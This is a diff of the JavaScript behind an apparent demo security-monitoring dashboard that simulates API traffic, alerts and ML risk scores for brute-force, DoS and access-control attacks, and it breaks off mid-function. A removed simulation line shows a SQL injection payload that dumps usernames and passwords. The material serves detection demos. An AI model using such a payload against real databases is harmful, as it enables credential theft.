+    <!-- COMPLETE CLIENT-SIDE INTERACTIVE ENGINE -->
     <script>
-        // Interactive Client Simulation Script
-        let chart;
-        const timelineLabels = ['12:00', '12:05', '12:10', '12:15', '12:20', '12:25'];
-        const riskData = [12, 15, 14, 18, 16, 20];
+        // Global Data Store
+        const State = {
+            requests: [],
+            alerts: [],
+            logs: [],
+            simulations: [],
+            trafficChart: null,
+            categoryChart: null,
+            featureChart: null,
+            currentTab: 'dashboard'
+        };
 
+        // Initialize state on load
         document.addEventListener('DOMContentLoaded', () => {
-            const ctx = document.getElementById('demoChart').getContext('2d');
-            const gradient = ctx.createLinearGradient(0, 0, 0, 240);
-            gradient.addColorStop(0, 'rgba(0, 240, 255, 0.4)');
-            gradient.addColorStop(0.6, 'rgba(0, 240, 255, 0.08)');
-            gradient.addColorStop(1, 'rgba(0, 240, 255, 0.0)');
+            initClock();
+            initSampleData();
+            initCharts();
+            renderAll();
+        });
 
-            chart = new Chart(ctx, {
+        function initClock() {
+            const clockEl = document.getElementById('socClock');
+            if (!clockEl) return;
+            function update() {
+                const now = new Date();
+                const timeStr = now.toTimeString().split(' ')[0];
+                const utcStr = now.toISOString().slice(11, 19) + ' UTC';
+                clockEl.innerHTML = `<i class="bi bi-clock me-1 text-cyan"></i>${timeStr} <span class="text-muted ms-1">(${utcStr})</span>`;
+            }
+            update();
+            setInterval(update, 1000);
+        }
+
+        // Tab Switching Engine
+        function switchTab(tabId) {
+            State.currentTab = tabId;
+            ['dashboard', 'traffic', 'alerts', 'simulation', 'models', 'logs'].forEach(t => {
+                const sec = document.getElementById(`view-${t}`);
+                const nav = document.getElementById(`nav-${t}`);
+                if (sec) sec.classList.toggle('d-none', t !== tabId);
+                if (nav) nav.classList.toggle('active', t === tabId);
+            });
+
+            if (tabId === 'dashboard') {
+                setTimeout(() => {
+                    if (State.trafficChart) State.trafficChart.resize();
+                    if (State.categoryChart) State.categoryChart.resize();
+                }, 100);
+            } else if (tabId === 'models') {
+                setTimeout(() => {
+                    if (State.featureChart) State.featureChart.resize();
+                }, 100);
+            }
+        }
+
+        // Realistic Baseline Data Generator
+        function initSampleData() {
+            const endpoints = [
+                ['GET', '/api/v1/products', 200, 35, 180, 'Normal', 12, '192.168.1.105', 'None', false],
+                ['GET', '/api/v1/products/featured', 200, 42, 320, 'Normal', 15, '10.0.4.22', 'None', false],
+                ['GET', '/api/v1/user/profile', 200, 28, 210, 'Normal', 10, '172.16.2.14', 'None', false],
+                ['POST', '/api/v1/cart/items', 201, 55, 410, 'Normal', 18, '192.168.2.45', 'None', false],
+                ['GET', '/api/v1/health', 200, 12, 45, 'Normal', 8, '10.20.1.88', 'None', false],
+                ['POST', '/api/v1/auth/login', 401, 75, 240, 'Potential Attack', 92, '198.51.100.44', 'Credential Stuffing', true],
+                ['GET', '/api/v1/analytics/reports', 429, 950, 450, 'Potential Attack', 88, '203.0.113.88', 'Rate Limit DoS', true],
+                ['GET', '/api/v1/admin/users/export', 403, 140, 380, 'Potential Attack', 78, '185.220.101.5', 'BOLA Probe', true],
+                ['GET', '/api/v1/notifications', 200, 22, 95, 'Normal', 11, '192.168.10.15', 'None', false],
+                ['POST', '/api/v1/search', 200, 68, 520, 'Normal', 19, '172.24.12.9', 'None', false]
+            ];
+
+            const now = new Date();
+            State.requests = [];
+            for (let i = 0; i < 35; i++) {
+                const ep = endpoints[i % endpoints.length];
+                const time = new Date(now.getTime() - (35 - i) * 180000);
+                const reqId = 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+                State.requests.push({
+                    id: i + 1,
+                    request_id: reqId,
+                    timestamp: time.toLocaleTimeString(),
+                    full_time: time.toISOString().replace('T', ' ').slice(0, 19),
+                    method: ep[0],
+                    endpoint: ep[1],
+                    status_code: ep[2],
+                    response_time_ms: ep[3] + Math.floor(Math.random() * 15),
+                    payload_size: ep[4],
+                    classification: ep[5],
+                    risk_score: ep[6],
+                    ip_address: ep[7],
+                    threat_type: ep[8],
+                    is_blocked: ep[9],
+                    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                    anomaly_score: (ep[6] * 0.85).toFixed(1),
+                    reasons: ep[5] === 'Normal' ? 'Conforms to expected normal operational API baseline' : 'Triggered automated behavioral threat heuristics'
+                });
+            }
+
+            State.alerts = [
+                {
+                    id: 1,
+                    alert_id: 'ALT-98B12',
+                    alert_title: 'Credential Stuffing / Brute Force Detected',
+                    category: 'Authentication',
+                    severity: 'Critical',
+                    source_ip: '198.51.100.44',
+                    endpoint: '/api/v1/auth/login',
+                    risk_score: 92,
+                    timestamp: new Date(now.getTime() - 600000).toLocaleTimeString(),
+                    description: 'Sequential dictionary authentication failures (8 attempts) detected targeting user login gateway.',
+                    recommended_action: 'Temporarily ban IP in WAF/Firewall, enforce exponential login backoff, and require CAPTCHA challenge.',
+                    status: 'Active'
+                },
+                {
+                    id: 2,
+                    alert_id: 'ALT-77C40',
+                    alert_title: 'Volumetric Rate Limit Anomaly / DoS Spike',
+                    category: 'Volumetric',
+                    severity: 'Critical',
+                    source_ip: '203.0.113.88',
+                    endpoint: '/api/v1/analytics/reports',
+                    risk_score: 88,
+                    timestamp: new Date(now.getTime() - 1200000).toLocaleTimeString(),
+                    description: 'Source IP exceeded API rate envelope by 480% with concurrent requests causing backend latency degradation.',
+                    recommended_action: 'Activate gateway volumetric rate limiting, return HTTP 429 Retry-After, and enable DDoS protection.',
+                    status: 'Active'
+                },
+                {
+                    id: 3,
+                    alert_id: 'ALT-45E91',
+                    alert_title: 'BOLA / Broken Object Level Auth Probe',
+                    category: 'Access Control',
+                    severity: 'High',
+                    source_ip: '185.220.101.5',
+                    endpoint: '/api/v1/admin/users/export',
+                    risk_score: 78,
+                    timestamp: new Date(now.getTime() - 1800000).toLocaleTimeString(),
+                    description: 'Client presented untrusted/forged bearer token attempting to access administrative user directory export.',
+                    recommended_action: 'Revoke active token signing keys, invalidate suspect session, and audit RBAC middleware.',
+                    status: 'Investigating'
+                }
+            ];
+
+            State.logs = [
+                { timestamp: new Date(now.getTime() - 600000).toLocaleTimeString(), event_type: 'DETECTION', source_ip: '198.51.100.44', endpoint: '/api/v1/auth/login', risk_score: 92, detection_result: 'Brute Force Attack Confirmed', action_taken: 'Blocked & Alert Raised' },
+                { timestamp: new Date(now.getTime() - 1200000).toLocaleTimeString(), event_type: 'BLOCK', source_ip: '203.0.113.88', endpoint: '/api/v1/analytics/reports', risk_score: 88, detection_result: 'Volumetric Limit Exceeded', action_taken: 'HTTP 429 Throttled' },
+                { timestamp: new Date(now.getTime() - 1800000).toLocaleTimeString(), event_type: 'DETECTION', source_ip: '185.220.101.5', endpoint: '/api/v1/admin/users/export', risk_score: 78, detection_result: 'BOLA Probe Detected', action_taken: 'Access Denied (403)' },
+                { timestamp: new Date(now.getTime() - 3600000).toLocaleTimeString(), event_type: 'AUTH', source_ip: '127.0.0.1', endpoint: '/login', risk_score: 0, detection_result: 'Authentication Succeeded', action_taken: 'Session Granted' },
+                { timestamp: new Date(now.getTime() - 7200000).toLocaleTimeString(), event_type: 'SYSTEM', source_ip: '127.0.0.1', endpoint: '/system/init', risk_score: 0, detection_result: 'SOC Engine Online', action_taken: 'Boot Initialized' }
+            ];
+
+            State.simulations = [
+                { time: '13:40', scenario: 'Credential Stuffing', risk: 92, details: 'Simulated 8 sequential failed login attempts from 198.51.100.44' },
+                { time: '13:25', scenario: 'Volumetric DoS', risk: 88, details: 'Simulated 20 concurrent requests flooding analytics endpoint' },
+                { time: '13:10', scenario: 'Normal Baseline', risk: 14, details: 'Generated 5 standard client catalog requests' }
+            ];
+        }
+
+        function initCharts() {
+            // 1. Traffic Activity Timeline Chart
+            const ctx1 = document.getElementById('trafficTimelineChart').getContext('2d');
+            const g1 = ctx1.createLinearGradient(0, 0, 0, 240);
+            g1.addColorStop(0, 'rgba(0, 240, 255, 0.35)');
+            g1.addColorStop(0.6, 'rgba(0, 240, 255, 0.08)');
+            g1.addColorStop(1, 'rgba(0, 240, 255, 0.0)');
+
+            const g2 = ctx1.createLinearGradient(0, 0, 0, 240);
+            g2.addColorStop(0, 'rgba(255, 183, 3, 0.25)');
+            g2.addColorStop(1, 'rgba(255, 183, 3, 0.0)');
+
+            const recentTimeline = State.requests.slice(-12);
+            const labels = recentTimeline.map(r => r.timestamp);
+            const scores = recentTimeline.map(r => r.risk_score);
+            const latencies = recentTimeline.map(r => r.response_time_ms);
+
+            State.trafficChart = new Chart(ctx1, {
                 type: 'line',
                 data: {
-                    labels: timelineLabels,
+                    labels: labels,
+                    datasets: [
+                        {
+                            label: 'Risk Score (0-100)',
+                            data: scores,
+                            borderColor: '#00f0ff',
+                            backgroundColor: g1,
+                            borderWidth: 2.5,
+                            tension: 0.4,
+                            fill: true,
+                            pointRadius: 4,
+                            pointHoverRadius: 8,
+                            pointBackgroundColor: '#00f0ff',
+                            pointBorderColor: '#050811',
+                            pointBorderWidth: 2,
+                            yAxisID: 'y'
+                        },
+                        {
+                            label: 'Latency (ms)',
+                            data: latencies,
+                            borderColor: '#ffb703',
+                            backgroundColor: g2,
+                            borderWidth: 1.8,
+                            borderDash: [5, 4],
+                            tension: 0.3,
+                            fill: true,
+                            pointRadius: 3,
+                            pointHoverRadius: 6,
+                            pointBackgroundColor: '#ffb703',
+                            pointBorderColor: '#050811',
+                            pointBorderWidth: 2,
+                            yAxisID: 'y1'
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { labels: { color: '#94a3b8', font: { family: 'Inter', size: 11, weight: '600' } } },
+                        tooltip: { backgroundColor: 'rgba(8, 12, 24, 0.95)', titleColor: '#00f0ff', bodyColor: '#f8fafc', borderColor: 'rgba(0, 240, 255, 0.4)', borderWidth: 1.5 }
+                    },
+                    scales: {
+                        x: { grid: { color: 'rgba(255, 255, 255, 0.04)' }, ticks: { color: '#64748b', font: { family: 'Fira Code', size: 10 } } },
+                        y: { min: 0, max: 100, position: 'left', grid: { color: 'rgba(255, 255, 255, 0.05)' }, ticks: { color: '#00f0ff', font: { size: 10, weight: '600' } }, title: { display: true, text: 'Risk Score (0-100)', color: '#00f0ff', font: { size: 11, weight: '700' } } },
+                        y1: { min: 0, position: 'right', grid: { drawOnChartArea: false }, ticks: { color: '#ffb703', font: { size: 10, weight: '600' } }, title: { display: true, text: 'Latency (ms)', color: '#ffb703', font: { size: 11, weight: '700' } } }
+                    }
+                }
+            });
+
+            // 2. Threat Categories Doughnut Chart
+            const ctx2 = document.getElementById('threatCategoryChart').getContext('2d');
+            State.categoryChart = new Chart(ctx2, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Authentication', 'Volumetric', 'Access Control', 'Injection'],
                     datasets: [{
-                        label: 'Risk Score (0-100)',
-                        data: riskData,
-                        borderColor: '#00f0ff',
-                        backgroundColor: gradient,
-                        borderWidth: 2.5,
-                        tension: 0.4,
-                        fill: true,
-                        pointRadius: 4,
-                        pointHoverRadius: 8,
-                        pointBackgroundColor: '#00f0ff',
-                        pointBorderColor: '#050811',
-                        pointBorderWidth: 2
+                        data: [2, 1, 1, 1],
+                        backgroundColor: ['#ff2e63', '#ffb703', '#3b82f6', '#00f59b'],
+                        borderColor: '#0a0f1d',
+                        borderWidth: 3,
+                        hoverOffset: 8
                     }]
                 },
                 options: {
                     responsive: true,
                     maintainAspectRatio: false,
-                    scales: {
-                        y: { min: 0, max: 100, ticks: { color: '#00f0ff' }, grid: { color: 'rgba(255, 255, 255, 0.05)' } },
-                        x: { ticks: { color: '#64748b' }, grid: { color: 'rgba(255, 255, 255, 0.03)' } }
+                    plugins: {
+                        legend: { position: 'bottom', labels: { color: '#94a3b8', font: { family: 'Inter', size: 10, weight: '500' }, padding: 8 } }
                     },
-                    plugins: { legend: { display: false } }
+                    cutout: '70%'
                 }
             });
-        });
 
-        function runClientSim(type) {
-            const consoleEl = document.getElementById('demoConsole');
-            const now = new Date().toLocaleTimeString();
+            // 3. Feature Importance Horizontal Bar Chart
+            const ctx3 = document.getElementById('featureImportanceChart').getContext('2d');
+            State.featureChart = new Chart(ctx3, {
+                type: 'bar',
+                data: {
+                    labels: ['Payload Risk Regex', 'Failed Login Count', 'Request Frequency', 'Auth Token Status', 'HTTP Status Code', 'Endpoint Sensitivity', 'Response Latency', 'Payload Size'],
+                    datasets: [{
+                        label: 'Gini Importance Weight',
+                        data: [0.342, 0.278, 0.185, 0.089, 0.051, 0.034, 0.013, 0.008],
+                        backgroundColor: 'rgba(0, 240, 255, 0.5)',
+                        borderColor: '#00f0ff',
+                        borderWidth: 1.5,
+                        borderRadius: 4
+                    }]
+                },
+                options: {
+                    indexAxis: 'y',
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false },
+                        tooltip: { backgroundColor: '#111827', titleColor: '#00f0ff', bodyColor: '#ffffff', callbacks: { label: (ctx) => `Weight: ${(ctx.raw * 100).toFixed(1)}%` } }
+                    },
+                    scales: {
+                        x: { grid: { color: 'rgba(255, 255, 255, 0.05)' }, ticks: { color: '#64748b' } },
+                        y: { grid: { display: false }, ticks: { color: '#f8fafc', font: { family: 'Inter', size: 11 } } }
+                    }
+                }
+            });
+        }
+
+        function renderAll() {
+            renderDashboardKPIs();
+            renderRecentTables();
+            renderTrafficTable();
+            renderAlertsCards();
+            renderLogsTable();
+            renderSimHistory();
+        }
+
+        function renderDashboardKPIs() {
+            const total = State.requests.length;
+            const safe = State.requests.filter(r => r.classification === 'Normal').length;
+            const suspicious = State.requests.filter(r => r.classification === 'Suspicious').length;
+            const blocked = State.requests.filter(r => r.is_blocked || r.classification === 'Potential Attack').length;
+            const activeAlerts = State.alerts.filter(a => a.status === 'Active' || a.status === 'Investigating').length;
+            const avgLat = Math.round(State.requests.reduce((a, b) => a + b.response_time_ms, 0) / (total || 1));
+
+            document.getElementById('kpiTotalRequests').innerText = total.toLocaleString();
+            document.getElementById('kpiSafeRequests').innerText = safe.toLocaleString();
+            document.getElementById('kpiSuspiciousRequests').innerText = suspicious.toLocaleString();
+            document.getElementById('kpiBlockedRequests').innerText = blocked.toLocaleString();
+            document.getElementById('kpiActiveAlerts').innerText = activeAlerts;
+            document.getElementById('kpiAvgLatency').innerText = avgLat + ' ms';
+
+            const badge = document.getElementById('threatLevelBadge');
+            const text = document.getElementById('threatLevelText');
+            if (activeAlerts > 1) {
+                text.innerText = 'DEFCON 2: ELEVATED';
+                badge.className = 'threat-banner-badge elevated';
+            } else if (activeAlerts > 0) {
+                text.innerText = 'DEFCON 3: GUARDED';
+                badge.className = 'threat-banner-badge';
+            } else {
+                text.innerText = 'DEFCON 5: NORMAL';
+                badge.className = 'threat-banner-badge normal';
+            }
+        }
+
+        function renderRecentTables() {
+            // Recent Alerts on dashboard
+            const recentA = State.alerts.slice(0, 5);
+            document.getElementById('recentAlertsTbody').innerHTML = recentA.map(a => `
+                <tr>
+                    <td><span class="badge-soc ${getSeverityClass(a.severity)}">${a.severity}</span></td>
+                    <td><div class="fw-bold text-white">${escapeHtml(a.alert_title)}</div><div class="small text-muted font-mono">${escapeHtml(a.endpoint)}</div></td>
+                    <td class="font-mono text-cyan">${escapeHtml(a.source_ip)}</td>
+                    <td>
+                        <div class="fw-bold font-mono ${getRiskColorClass(a.risk_score)}">${a.risk_score} / 100</div>
+                        <div class="risk-meter"><div class="risk-meter-fill ${getRiskFillClass(a.risk_score)}" style="width: ${a.risk_score}%"></div></div>
+                    </td>
+                    <td class="text-end">
+                        <button onclick="switchTab('alerts')" class="btn btn-sm btn-cyber-outline py-1 px-2"><i class="bi bi-shield-shaded"></i> Triage</button>
+                    </td>
+                </tr>
+            `).join('');
+
+            // Recent Requests on dashboard
+            const recentR = State.requests.slice(-6).reverse();
+            document.getElementById('recentRequestsTbody').innerHTML = recentR.map(r => `
+                <tr>
+                    <td><span class="badge-method badge-${r.method.toLowerCase()}">${r.method}</span></td>
+                    <td class="font-mono text-truncate" style="max-width: 170px;">${escapeHtml(r.endpoint)}</td>
+                    <td class="font-mono text-muted small">${escapeHtml(r.ip_address)}</td>
+                    <td><span class="badge ${r.status_code >= 400 ? 'bg-danger' : 'bg-success'} text-white font-mono">${r.status_code}</span></td>
+                    <td><span class="badge-soc ${getClassificationClass(r.classification)}">${r.classification}</span></td>
+                    <td class="font-mono text-end ${getRiskColorClass(r.risk_score)} fw-bold">${r.risk_score}</td>
+                </tr>
+            `).join('');
+        }
+
+        function renderTrafficTable() {
+            const list = State.filteredRequests || State.requests.slice().reverse();
+            document.getElementById('trafficCountBadge').innerText = `${list.length} requests`;
+            document.getElementById('trafficTableBody').innerHTML = list.map(r => `
+                <tr>
+                    <td class="font-mono small text-cyan">${escapeHtml(r.request_id)}</td>
+                    <td class="small text-muted font-mono">${r.timestamp}</td>
+                    <td><span class="badge-method badge-${r.method.toLowerCase()}">${r.method}</span></td>
+                    <td class="font-mono text-truncate" style="max-width: 220px;">${escapeHtml(r.endpoint)}</td>
+                    <td class="font-mono text-muted small">${escapeHtml(r.ip_address)}</td>
+                    <td><span class="badge ${r.status_code >= 400 ? 'bg-danger' : 'bg-success'} text-white font-mono">${r.status_code}</span></td>
+                    <td class="font-mono small text-muted">${r.response_time_ms} ms</td>
+                    <td><span class="badge-soc ${getClassificationClass(r.classification)}">${r.classification}</span></td>
+                    <td>
+                        <div class="d-flex align-items-center gap-2">
+                            <span class="font-mono fw-bold ${getRiskColorClass(r.risk_score)}">${r.risk_score}</span>
+                            <button class="btn btn-sm btn-cyber-outline py-0 px-2 ms-auto" onclick="inspectRequest(${r.id})">
+                                <i class="bi bi-search"></i> Inspect
+                            </button>
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function filterTraffic() {
+            const q = (document.getElementById('trafficSearch')?.value || '').toLowerCase();
+            const method = document.getElementById('methodFilter')?.value || 'ALL';
+            const cls = document.getElementById('classFilter')?.value || 'ALL';
+            const status = document.getElementById('statusFilter')?.value || 'ALL';
+
+            State.filteredRequests = State.requests.slice().reverse().filter(r => {
+                const matchQ = !q || r.request_id.toLowerCase().includes(q) || r.endpoint.toLowerCase().includes(q) || r.ip_address.includes(q);
+                const matchM = method === 'ALL' || r.method === method;
+                const matchC = cls === 'ALL' || r.classification === cls;
+                const matchS = status === 'ALL' || r.status_code.toString() === status;
+                return matchQ && matchM && matchC && matchS;
+            });
+
+            renderTrafficTable();
+        }
+
+        function renderAlertsCards() {
+            const list = State.filteredAlerts || State.alerts;
+            document.getElementById('totalAlertsCount').innerText = `${list.length} Incidents`;
+
+            document.getElementById('alertsCardsContainer').innerHTML = list.map(a => `
+                <div class="col-md-6 col-xl-4 mb-4">
+                    <div class="soc-card h-100 d-flex flex-column justify-content-between">
+                        <div>
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <span class="badge-soc ${getSeverityClass(a.severity)}"><i class="bi bi-shield-exclamation"></i> ${a.severity}</span>
+                                <span class="badge bg-secondary font-mono small">${a.category}</span>
+                            </div>
+                            <h5 class="text-white fw-bold mb-1">${escapeHtml(a.alert_title)}</h5>
+                            <div class="font-mono text-cyan small mb-2">${escapeHtml(a.endpoint)}</div>
+                            <div class="d-flex align-items-center justify-content-between my-2 p-2 rounded bg-black">
+                                <span class="text-muted small">Source IP: <strong class="text-light font-mono">${escapeHtml(a.source_ip)}</strong></span>
+                                <span class="font-mono fw-bold ${getRiskColorClass(a.risk_score)}">Risk: ${a.risk_score}/100</span>
+                            </div>
+                            <p class="small text-light opacity-80 mb-3">${escapeHtml(a.description)}</p>
+                            <div class="p-2 rounded border border-secondary bg-dark mb-3">
+                                <div class="small fw-bold text-cyan mb-1"><i class="bi bi-play-circle me-1"></i>SOC Recommended Playbook:</div>
+                                <div class="small text-light">${escapeHtml(a.recommended_action)}</div>
+                            </div>
+                        </div>
+                        <div class="d-flex align-items-center justify-content-between pt-2 border-top border-secondary">
+                            <span class="badge ${getStatusBadgeClass(a.status)}">${a.status}</span>
+                            <div class="btn-group btn-group-sm">
+                                ${a.status !== 'Mitigated' ? `<button class="btn btn-soc-danger" onclick="updateAlertStatus(${a.id}, 'Mitigated')"><i class="bi bi-ban"></i> Mitigate IP</button>` : ''}
+                                ${a.status !== 'Resolved' ? `<button class="btn btn-cyber-outline" onclick="updateAlertStatus(${a.id}, 'Resolved')"><i class="bi bi-check2-circle"></i> Resolve</button>` : ''}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function filterAlerts() {
+            const q = (document.getElementById('alertSearch')?.value || '').toLowerCase();
+            const sev = document.getElementById('alertSeverityFilter')?.value || 'ALL';
+            const st = document.getElementById('alertStatusFilter')?.value || 'ALL';
+
+            State.filteredAlerts = State.alerts.filter(a => {
+                const matchQ = !q || a.alert_title.toLowerCase().includes(q) || a.source_ip.includes(q) || a.endpoint.toLowerCase().includes(q);
+                const matchSev = sev === 'ALL' || a.severity === sev;
+                const matchSt = st === 'ALL' || a.status === st;
+                return matchQ && matchSev && matchSt;
+            });
+
+            renderAlertsCards();
+        }
+
+        function updateAlertStatus(id, newStatus) {
+            const a = State.alerts.find(item => item.id === id);
+            if (a) {
+                a.status = newStatus;
+                showNotification('Status Updated', `Alert ${a.alert_id} marked as ${newStatus}.`, 'success');
+                renderAlertsCards();
+                renderDashboardKPIs();
+            }
+        }
+
+        function inspectRequest(reqId) {
+            const r = State.requests.find(item => item.id === reqId);
+            if (!r) return;
+
+            document.getElementById('inspectReqId').innerText = r.request_id;
+            document.getElementById('inspectMethod').innerText = r.method;
+            document.getElementById('inspectEndpoint').innerText = r.endpoint;
+            document.getElementById('inspectIp').innerText = r.ip_address;
+            document.getElementById('inspectTimestamp').innerText = r.full_time || r.timestamp;
+            document.getElementById('inspectStatus').innerText = r.status_code;
+            document.getElementById('inspectLatency').innerText = `${r.response_time_ms} ms`;
+            document.getElementById('inspectPayloadSize').innerText = `${r.payload_size} bytes`;
+            document.getElementById('inspectUserAgent').innerText = r.user_agent;
+            document.getElementById('inspectClassification').innerHTML = `<span class="badge-soc ${getClassificationClass(r.classification)}">${r.classification}</span>`;
+            document.getElementById('inspectRiskScore').innerHTML = `<span class="font-mono fw-bold fs-5 ${getRiskColorClass(r.risk_score)}">${r.risk_score} / 100</span>`;
+            document.getElementById('inspectAnomalyScore').innerText = `${r.anomaly_score} / 100`;
+            document.getElementById('inspectBlocked').innerHTML = r.is_blocked ? `<span class="badge bg-danger">BLOCKED AT WAF</span>` : `<span class="badge bg-success">PASSED</span>`;
+
+            document.getElementById('inspectReasonsList').innerHTML = r.reasons.split('; ').map(reason => `
+                <li class="list-group-item bg-dark text-light border-secondary small d-flex align-items-center gap-2">
+                    <i class="bi bi-arrow-right-circle text-cyan"></i> ${escapeHtml(reason)}
+                </li>
+            `).join('');
+
+            new bootstrap.Modal(document.getElementById('requestInspectModal')).show();
+        }
+
+        // CLIENT SIMULATION ENGINE (Matches Python backend detection algorithms)
+        function triggerClientSimulation(type) {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString();
+            let newRequests = [];
+            let newAlert = null;
 
             if (type === 'normal') {
-                consoleEl.innerHTML += `<div class="text-light">[${now}] [DISPATCH] GET /api/v1/products - IP: 192.168.1.105</div>`;
-                consoleEl.innerHTML += `<div class="text-emerald">[${now}] [ML ENGINE] Classified: Safe (Risk Score: 12/100) - Allowed</div>`;
-                updateChart(12);
+                for (let i = 0; i < 3; i++) {
+                    const reqObj = {
+                        id: State.requests.length + 1,
+                        request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                        timestamp: timeStr,
+                        full_time: now.toISOString().replace('T', ' ').slice(0, 19),
+                        method: 'GET',
+                        endpoint: '/api/v1/products',
+                        status_code: 200,
+                        response_time_ms: 38 + Math.floor(Math.random() * 20),
+                        payload_size: 180,
+                        classification: 'Normal',
+                        risk_score: 12 + Math.floor(Math.random() * 8),
+                        ip_address: '192.168.1.105',
+                        threat_type: 'None',
+                        is_blocked: false,
+                        user_agent: 'Mozilla/5.0 Chrome/122.0.0.0',
+                        anomaly_score: '8.4',
+                        reasons: 'Conforms to expected normal operational API baseline'
+                    };
+                    State.requests.push(reqObj);
+                    newRequests.push(reqObj);
+                }
+                appendConsole(`[DISPATCH] Generated 3 normal API requests to /api/v1/products`, 'cmd');
+                appendConsole(`[ML ENGINE] Evaluated: Risk 14/100 (Normal Baseline) - Allowed`, 'success');
+                showNotification('Simulation Complete', 'Generated 3 normal requests (Risk Score: 14/100)', 'success');
+
             } else if (type === 'brute_force') {
-                consoleEl.innerHTML += `<div class="text-crimson">[${now}] [DISPATCH] POST /api/v1/auth/login - IP: 198.51.100.44 (8 failed attempts)</div>`;
-                consoleEl.innerHTML += `<div class="text-crimson fw-bold">[${now}] [ALERT] Credential Stuffing / Brute Force Detected (Risk Score: 92/100) - Blocked</div>`;
-                updateChart(92);
-                document.getElementById('kpiBlocked').innerText = parseInt(document.getElementById('kpiBlocked').innerText) + 1;
-            } else if (type === 'dos') {
-                consoleEl.innerHTML += `<div class="text-amber">[${now}] [DISPATCH] GET /api/v1/reports - IP: 203.0.113.88 (180 req/min flood)</div>`;
-                consoleEl.innerHTML += `<div class="text-amber fw-bold">[${now}] [ALERT] Volumetric Spike / Rate Limit DoS Detected (Risk Score: 85/100) - Throttled</div>`;
-                updateChart(85);
-            } else if (type === 'sqli') {
-                consoleEl.innerHTML += `<div class="text-crimson">[${now}] [DISPATCH] POST /api/v1/users/search - Payload: ' UNION SELECT username, password FROM users--</div>`;
-                consoleEl.innerHTML += `<div class="text-crimson fw-bold">[${now}] [ALERT] SQL Injection Detected in Payload (Risk Score: 96/100) - Blocked at WAF</div>`;
-                updateChart(96);
-                document.getElementById('kpiBlocked').innerText = parseInt(document.getElementById('kpiBlocked').innerText) + 1;
+                for (let i = 1; i <= 6; i++) {
+                    const reqObj = {
+                        id: State.requests.length + 1,
+                        request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                        timestamp: timeStr,
+                        full_time: now.toISOString().replace('T', ' ').slice(0, 19),
+                        method: 'POST',
+                        endpoint: '/api/v1/auth/login',
+                        status_code: 401,
+                        response_time_ms: 70 + (i * 12),
+                        payload_size: 245,
+                        classification: 'Potential Attack',
+                        risk_score: 85 + (i * 2),
+                        ip_address: '198.51.100.44',
+                        threat_type: 'Brute Force Attack',
+                        is_blocked: true,
+                        user_agent: 'Python-requests/2.31.0',
+                        anomaly_score: '88.2',
+                        reasons: `High consecutive failed logins (${i} attempts) indicates credential stuffing; Elevated request frequency`
+                    };
+                    State.requests.push(reqObj);
+                    newRequests.push(reqObj);
+                }
+                newAlert = {
+                    id: State.alerts.length + 1,
+                    alert_id: 'ALT-' + Math.random().toString(36).substring(2, 7).toUpperCase(),
+                    alert_title: 'Credential Stuffing / Brute Force Detected',
+                    category: 'Authentication',
+                    severity: 'Critical',
+                    source_ip: '198.51.100.44',
+                    endpoint: '/api/v1/auth/login',
+                    risk_score: 94,
+                    timestamp: timeStr,
+                    description: 'Rapid sequential authentication failures (6 attempts) detected targeting user login gateway.',
+                    recommended_action: 'Temporarily ban IP in WAF/Firewall, enforce exponential login backoff, and require CAPTCHA challenge.',
+                    status: 'Active'
+                };
+                State.alerts.unshift(newAlert);
+                appendConsole(`[DISPATCH] POST /api/v1/auth/login - 6 sequential failed password attempts from 198.51.100.44`, 'cmd');
+                appendConsole(`[ML ENGINE] Random Forest classified: Potential Attack (Prob: 0.96)`, 'danger');
+                appendConsole(`[ALERT] Generated Critical Alert ${newAlert.alert_id}! Risk Score: 94/100 - Blocked at WAF`, 'danger');
+                showNotification('Critical Alert Raised', 'Brute Force attack identified and blocked (Risk Score: 94)', 'danger');
+
+            } else if (type === 'dos_spike') {
+                for (let i = 1; i <= 10; i++) {
+                    const reqObj = {
+                        id: State.requests.length + 1,
+                        request_id: 'REQ-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                        timestamp: timeStr,
+                        full_time: now.toISOString().replace('T', ' ').slice(0, 19),
+                        method: 'GET',
+                        endpoint: '/api/v1/analytics/reports',
+                        status_code: i > 3 ? 429 : 200,
+                        response_time_ms: 120 + (i * 60),
+                        payload_size: 450,
+                        classification: 'Potential Attack',
+                        risk_score: 86,
+                        ip_address: '203.0.113.88',
+                        threat_type: 'Rate Limit DoS',
+                        is_blocked: i > 3,
+                        user_agent: 'Go-http-client/1.1',
+                        anomaly_score: '84.0',
+                        reasons: 'HTTP 429 Too Many Requests: Rate limiter triggered; Request rate spike exceeds typical threshold'
+                    };
+                    State.requests.push(reqObj);
+                    newRequests.push(reqObj);
+                }
+                newAlert = {
+                    id: State.alerts.length + 1,
+                    alert_id: 'ALT-' + Math.random().toString(36).substring(2, 7).toUpperCase(),
+                    alert_title: 'Volumetric Rate Limit Anomaly / DoS Detected',
+                    category: 'Volumetric',
+                    severity: 'Critical',
+                    source_ip: '203.0.113.88',
+                    endpoint: '/api/v1/analytics/reports',
+                    risk_score: 86,
+                    timestamp: timeStr,
+                    description: 'Burst of 10 concurrent requests exceeding standard rate envelope by 500%. Response latency degraded.',
+                    recommended_action: 'Activate gateway volumetric rate limiting, return HTTP 429 Retry-After, and enable DDoS protection.',
+                    status: 'Active'
+                };
+                State.alerts.unshift(newAlert);
+                appendConsole(`[DISPATCH] High-frequency burst of 10 requests to /api/v1/analytics/reports from 203.0.113.88`, 'cmd');
+                appendConsole(`[ML ENGINE] Isolation Forest Anomaly Index: 84/100`, 'warning');
+                appendConsole(`[ALERT] Generated Critical Alert ${newAlert.alert_id}! Risk: 86/100 - Throttled`, 'danger');
+                showNotification('DoS Alert Raised', 'Volumetric flood pattern identified (Risk Score: 86)', 'warning');
+
+            } else if (type === 'unauthorized') {
